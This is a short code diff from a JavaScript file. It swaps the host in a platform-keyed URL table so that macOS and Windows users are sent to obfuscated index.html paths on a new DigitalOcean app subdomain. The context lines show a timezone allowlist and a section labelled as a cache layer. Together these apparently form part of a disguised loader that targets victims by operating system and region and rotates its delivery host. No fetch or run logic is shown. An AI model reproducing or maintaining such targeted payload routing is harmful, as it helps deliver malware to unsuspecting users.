@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://hell-app-8vuhx.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://hell-app-8vuhx.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://hammerhead-app-7yue7.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://hammerhead-app-7yue7.ondigitalocean.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
